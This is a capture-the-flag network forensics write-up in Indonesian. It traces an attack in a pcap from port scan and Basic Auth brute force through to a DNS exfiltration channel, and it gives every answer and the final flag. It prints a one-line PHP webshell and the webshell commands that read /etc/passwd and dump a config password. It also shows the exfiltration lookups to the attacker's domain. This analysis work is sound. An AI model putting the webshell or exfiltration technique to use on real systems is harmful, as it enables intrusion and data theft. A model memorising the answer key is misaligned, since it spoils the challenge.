# NULLSTAR // BREACH — Forensics Writeup

## Ringkasan

Artefak yang dianalisis hanya satu:

```
capture.pcap
```

PCAP berisi seluruh aktivitas attacker terhadap host `192.168.10.50`, mulai dari port scan, brute-force HTTP Basic Auth, upload webshell, enumerasi filesystem, pembacaan config, sampai DNS exfiltration.

Delapan jawaban yang didapat:

| No. | Pertanyaan | Jawaban |
|---|---|---|
| 1 | Attacker IP | `10.13.37.101` |
| 2 | TCP port yang benar-benar diserang | `8080` |
| 3 | Password admin yang berhasil | `S3cr3t_P4ss!` |
| 4 | File yang di-upload | `sh3ll.php` |
| 5 | Protected file di /root | `secrets.kdbx` |
| 6 | Secret key dari config | `Vau1t_K3y_9f3a` |
| 7 | Domain DNS exfiltration | `t.0xv0id-c2.net` |
| 8 | Final flag | `0xV0ID{c0v3r7_DN5_ch4nn3l_r34553mbl3d_L1k3_4_Gh0st}` |

## 0. Initial Recon

Cek tipe file:

```bash
file capture.pcap
```

Hasil:

```
capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

PCAP-nya kecil, sekitar 19 KB, jadi seluruh traffic bisa ditelusuri tanpa perlu sampling.

Beberapa command dasar yang berguna:

```bash
capinfos capture.pcap
tshark -r capture.pcap -q -z io,phs
```

Untuk melihat percakapan IP:

```bash
tshark -r capture.pcap -q -z conv,ip
```

Dari traffic terlihat dua host utama:

```
10.13.37.101
192.168.10.50
```

`192.168.10.50` berperan sebagai victim/server, sedangkan `10.13.37.101` aktif menginisiasi scan dan koneksi ke service korban.

## 1. Attacker IP Address

**Pertanyaan:** What is the attacker's IP address?

Cari paket SYN yang memulai koneksi:

```bash
tshark -r capture.pcap \
  -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields \
  -e frame.number \
  -e ip.src \
  -e ip.dst \
  -e tcp.srcport \
  -e tcp.dstport
```

Traffic awal menunjukkan satu host mencoba banyak TCP port pada `192.168.10.50`.

Contoh pola yang muncul:

```
10.13.37.101:40000 -> 192.168.10.50:21
10.13.37.101:40001 -> 192.168.10.50:22
10.13.37.101:40002 -> 192.168.10.50:23
10.13.37.101:40003 -> 192.168.10.50:25
10.13.37.101:40004 -> 192.168.10.50:53
10.13.37.101:40005 -> 192.168.10.50:80
...
10.13.37.101:40012 -> 192.168.10.50:8080
10.13.37.101:40013 -> 192.168.10.50:8443
```

Ini jelas pola TCP SYN scan.

Host yang mengirim seluruh probe adalah:

```
10.13.37.101
```

**Jawaban:**

```
0xV0ID{10.13.37.101}
```

## 2. TCP Port yang Benar-Benar Diserang

**Pertanyaan:** The attacker found more than one port open, but only pursued one of them. Which TCP port did they actually attack?

Dari SYN scan, status port bisa dibedakan dari flag balasan:

```
SYN,ACK → port terbuka
RST,ACK → port tertutup
```

Filter:

```bash
tshark -r capture.pcap \
  -Y "ip.src == 192.168.10.50 && tcp.flags.syn == 1 && tcp.flags.ack == 1" \
  -T fields \
  -e frame.number \
  -e tcp.srcport \
  -e ip.dst
```

Dua port merespons dengan `SYN,ACK`:

```
22
8080
```

Port 22 hanya ditemukan oleh scanner dan tidak dilanjutkan.

Sebaliknya, sesudah scan attacker membuka koneksi baru ke:

```
10.13.37.101:44100 -> 192.168.10.50:8080
```

Lalu mengirim:

```
GET / HTTP/1.1
Host: 192.168.10.50:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) BruteForcer/2.1
```

Server membalas:

```
HTTP/1.1 200 OK
Server: 0xV0ID-httpd/0.9
```

Body:

```html
<html>
<title>0xV0ID Admin Console</title>
<body>
<h1>NULLSTAR OPS</h1>
<p>Authentication required at /admin/login</p>
</body>
</html>
```

Jadi service yang benar-benar dipursue adalah HTTP admin console di TCP 8080.

**Jawaban:**

```
0xV0ID{8080}
```

## 3. Password Admin yang Berhasil

**Pertanyaan:** The attacker got into the admin console by guessing. What password did they finally log in with?

Sesudah menemukan admin console, attacker berulang kali melakukan:

```
GET /admin/login
Authorization: Basic ...
```

Untuk melihat header HTTP:

```bash
tshark -r capture.pcap \
  -Y "tcp.port == 8080 && http" \
  -T fields \
  -e frame.number \
  -e http.request.method \
  -e http.request.uri \
  -e http.authorization \
  -e http.response.code
```

Kalau field `http.authorization` tidak muncul di versi tshark tertentu, alternatif:

```bash
tshark -r capture.pcap -Y "tcp.port == 8080" -V | grep -i -A2 -B2 "Authorization"
```

HTTP Basic Authentication hanya Base64 dari:

```
username:password
```

Percobaan yang terlihat:

**Attempt 1**

```
YWRtaW46YWRtaW4=
```

Decode:

```bash
echo 'YWRtaW46YWRtaW4=' | base64 -d
```

Hasil: `admin:admin` — Response: `401 Unauthorized`

**Attempt 2**

```
YWRtaW46cGFzc3dvcmQ=
```

Hasil: `admin:password` — Response: `401 Unauthorized`

**Attempt 3**

```
YWRtaW46bGV0bWVpbg==
```

Hasil: `admin:letmein` — Response: `401 Unauthorized`

**Attempt 4**

```
YWRtaW46YWRtaW4xMjM=
```

Hasil: `admin:admin123` — Response: `401 Unauthorized`

**Attempt 5**

```
YWRtaW46cm9vdA==
```

Hasil: `admin:root` — Response: `401 Unauthorized`

**Attempt yang berhasil**

Header:

```
Authorization: Basic YWRtaW46UzNjcjN0X1A0c3Mh
```

Decode:

```bash
echo 'YWRtaW46UzNjcjN0X1A0c3Mh' | base64 -d
```

Hasil:

```
admin:S3cr3t_P4ss!
```

Response server berubah menjadi:

```
HTTP/1.1 200 OK
```

Body:

```
<h1>Welcome, admin</h1>
<p>Console unlocked. Upload at /admin/upload.php</p>
```

Jadi password valid adalah:

```
S3cr3t_P4ss!
```

**Jawaban:**

```
0xV0ID{S3cr3t_P4ss!}
```

## 4. Tool yang Ditanam ke Server

**Pertanyaan:** Once inside, they planted something. What is the filename of the tool they uploaded to the server?

Sesudah login berhasil, attacker mengakses endpoint upload:

```
POST /admin/upload.php
```

Cari POST request:

```bash
tshark -r capture.pcap \
  -Y 'http.request.method == "POST"' \
  -V
```

Request menggunakan multipart form:

```
Content-Type: multipart/form-data; boundary=----0xV0IDBoundary7MA4YWxk
```

Bagian file:

```
Content-Disposition: form-data; name="file"; filename="sh3ll.php"
Content-Type: application/x-php
```

Isi file:

```php
<?php system($_GET['cmd']); ?>
```

Ini webshell PHP sederhana yang menjalankan parameter `cmd` melalui `system()`.

Server mengonfirmasi upload:

```json
{"status":"ok","path":"/uploads/sh3ll.php"}
```

Nama tool yang ditanam:

```
sh3ll.php
```

**Jawaban:**

```
0xV0ID{sh3ll.php}
```

## 5. Protected File di /root

**Pertanyaan:** They went digging through the filesystem. What is the name of the protected file they found in root's home directory?

Setelah upload, attacker mulai memanggil webshell.

Request pertama:

```
GET /uploads/sh3ll.php?cmd=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Kemudian:

```
GET /uploads/sh3ll.php?cmd=cat%20/etc/passwd
```

Setelah itu attacker melakukan listing `/root`:

```
GET /uploads/sh3ll.php?cmd=ls%20-la%20/root
```

URL decode parameter:

```
ls -la /root
```

Response:

```
total 24
drwx------  2 root root 4096 Apr 11 02:14 .
drwxr-xr-x 18 root root 4096 Apr 10 22:00 ..
-rw-------  1 root root 8192 Apr 11 02:13 secrets.kdbx
```

File `.kdbx` adalah format database KeePass.

Nama file yang ditemukan:

```
secrets.kdbx
```

**Jawaban:**

```
0xV0ID{secrets.kdbx}
```

## 6. Secret Key dari Application Config

**Pertanyaan:** At one point the attacker dumped an application config. It doesn't look like much on the wire — but decode it and it gives up a secret key. What is it?

Request berikutnya:

```
GET /uploads/sh3ll.php?cmd=base64%20/opt/app/config.php
```

Command setelah URL decode:

```
base64 /opt/app/config.php
```

Server mengembalikan:

```
PD9waHAKJERCX0hPU1Q9JzEyNy4wLjAuMSc7CiREQl9VU0VSPSdhcHBzdmMnOwokREJfUEFTUz0nVmF1MXRfSzN5XzlmM2EnOwokREJfTkFNRT0nMHh2MGlkX2FwcCc7Ci8vIFRPRE86IHJvdGF0ZSB2YXVsdCBrZXkgYmVmb3JlIGF1ZGl0Cj8+Cg==
```

Decode:

```bash
echo 'PD9waHAKJERCX0hPU1Q9JzEyNy4wLjAuMSc7CiREQl9VU0VSPSdhcHBzdmMnOwokREJfUEFTUz0nVmF1MXRfSzN5XzlmM2EnOwokREJfTkFNRT0nMHh2MGlkX2FwcCc7Ci8vIFRPRE86IHJvdGF0ZSB2YXVsdCBrZXkgYmVmb3JlIGF1ZGl0Cj8+Cg==' | base64 -d
```

Hasil:

```php
<?php
$DB_HOST='127.0.0.1';
$DB_USER='appsvc';
$DB_PASS='Vau1t_K3y_9f3a';
$DB_NAME='0xv0id_app';
// TODO: rotate vault key before audit
?>
```

Nilai yang dicari:

```
Vau1t_K3y_9f3a
```

**Jawaban:**

```
0xV0ID{Vau1t_K3y_9f3a}
```

## 7. DNS Exfiltration Domain

**Pertanyaan:** Shortly after, the victim started making a lot of very strange name lookups. What domain was the data being leaked to?

Sesudah HTTP activity selesai, host korban mulai mengirim DNS query.

Filter:

```bash
tshark -r capture.pcap \
  -Y "dns.flags.response == 0" \
  -T fields \
  -e frame.number \
  -e ip.src \
  -e ip.dst \
  -e dns.qry.name
```

Awalnya ada query yang normal:

```
ubuntu.com
pool.ntp.org
api.github.com
cdn.jsdelivr.net
0xv0id-app.internal
mirrors.kernel.org
sync.0xv0id-app.internal
```

Lalu muncul pola yang jauh berbeda:

```
00mnftkqt2.t.0xv0id-c2.net
01gasdgbaf.t.0xv0id-c2.net
02ibjwi3bh.t.0xv0id-c2.net
03hqdcwpby.t.0xv0id-c2.net
04aaor2er7.t.0xv0id-c2.net
05nqiucb2b.t.0xv0id-c2.net
06njrvsei7.t.0xv0id-c2.net
07ci3wyl2d.t.0xv0id-c2.net
08lbdqazdl.t.0xv0id-c2.net
09gqnrcich.t.0xv0id-c2.net
0ady.t.0xv0id-c2.net
```

Perhatikan formatnya:

```
<sequence><data>.t.0xv0id-c2.net
```

Contoh:

```
00 mnftkqt2 .t.0xv0id-c2.net
01 gasdgbaf .t.0xv0id-c2.net
02 ibjwi3bh .t.0xv0id-c2.net
...
0a dy       .t.0xv0id-c2.net
```

`00` sampai `0a` berfungsi sebagai sequence number, sedangkan label setelah sequence adalah potongan data.

Suffix konstan yang dipakai channel exfil adalah:

```
t.0xv0id-c2.net
```

Ini juga menjelaskan kenapa hanya menjawab `0xv0id-c2.net` tidak diterima oleh checker.

**Jawaban:**

```
0xV0ID{t.0xv0id-c2.net}
```

## 8. Reassemble dan Decode Final Exfiltration

**Pertanyaan:** Put it together. The intruder's real prize left the network the same quiet way those strange lookups did — scattered, wrapped, and locked with something you already recovered earlier in this capture. Reassemble it and read the message.

Ini bagian paling penting karena data tidak dikirim sebagai file biasa. Payload dibawa lewat label DNS.

### 8.1 Ambil hanya query exfiltration

Filter:

```bash
tshark -r capture.pcap \
  -Y 'dns.flags.response == 0 && dns.qry.name contains "t.0xv0id-c2.net"' \
  -T fields \
  -e dns.qry.name
```

Hasil:

```
00mnftkqt2.t.0xv0id-c2.net
01gasdgbaf.t.0xv0id-c2.net
02ibjwi3bh.t.0xv0id-c2.net
03hqdcwpby.t.0xv0id-c2.net
04aaor2er7.t.0xv0id-c2.net
05nqiucb2b.t.0xv0id-c2.net
06njrvsei7.t.0xv0id-c2.net
07ci3wyl2d.t.0xv0id-c2.net
08lbdqazdl.t.0xv0id-c2.net
09gqnrcich.t.0xv0id-c2.net
0ady.t.0xv0id-c2.net
```

### 8.2 Pisahkan sequence number

Potongan pertama memakai dua karakter sebagai sequence:

```
00 -> mnftkqt2
01 -> gasdgbaf
02 -> ibjwi3bh
03 -> hqdcwpby
04 -> aaor2er7
05 -> nqiucb2b
06 -> njrvsei7
07 -> ci3wyl2d
08 -> lbdqazdl
09 -> gqnrcich
0a -> dy
```

Urutkan berdasarkan sequence 00 sampai 0a, lalu concatenate payload:

```
mnftkqt2gasdgbafibjwi3bhhqdcwpbyaaor2er7nqiucb2bnjrvsei7ci3wyl2dlbdqazdlgqnrcichdy
```

### 8.3 Identifikasi encoding

String hanya memakai karakter:

```
a-z
2-7
```

Alphabet tersebut cocok dengan Base32.

Decode dengan Python:

```python
import base64
data = "mnftkqt2gasdgbafibjwi3bhhqdcwpbyaaor2er7nqiucb2bnjrvsei7ci3wyl2dlbdqazdlgqnrcichdy"
padding = "=" * ((8 - len(data) % 8) % 8)
raw = base64.b32decode(data.upper() + padding)
print(raw.hex())
```

Hasil ciphertext:

```
634b35427a30243304054053646c273c062b3c38001d1d123f6c114107416a6359111f12376c2f43584700646b341b1120471e
```

Panjang ciphertext:

```
51 bytes
```

Data masih belum readable, berarti Base32 hanya layer pembungkus.

### 8.4 Cari key yang dipakai

Clue challenge:

```
locked with something you already recovered earlier in this capture
```

Sebelumnya kita punya dua kandidat yang menonjol:

```
S3cr3t_P4ss!
Vau1t_K3y_9f3a
```

Key config `Vau1t_K3y_9f3a` bukan key untuk ciphertext final.

Yang cocok adalah password admin:

```
S3cr3t_P4ss!
```

Cipher menggunakan repeating XOR.

Secara sederhana:

```
plaintext[i] = ciphertext[i] XOR key[i % len(key)]
```

### 8.5 Decode repeating XOR

Script minimal:

```python
import base64
encoded = (
    "mnftkqt2"
    "gasdgbaf"
    "ibjwi3bh"
    "hqdcwpby"
    "aaor2er7"
    "nqiucb2b"
    "njrvsei7"
    "ci3wyl2d"
    "lbdqazdl"
    "gqnrcich"
    "dy"
)
key = b"S3cr3t_P4ss!"
padding = "=" * ((8 - len(encoded) % 8) % 8)
ciphertext = base64.b32decode(encoded.upper() + padding)
plaintext = bytes(
    byte ^ key[i % len(key)]
    for i, byte in enumerate(ciphertext)
)
print(plaintext.decode())
```

Output:

```
0xV0ID{c0v3r7_DN5_ch4nn3l_r34553mbl3d_L1k3_4_Gh0st}
```

Final flag:

```
0xV0ID{c0v3r7_DN5_ch4nn3l_r34553mbl3d_L1k3_4_Gh0st}
```
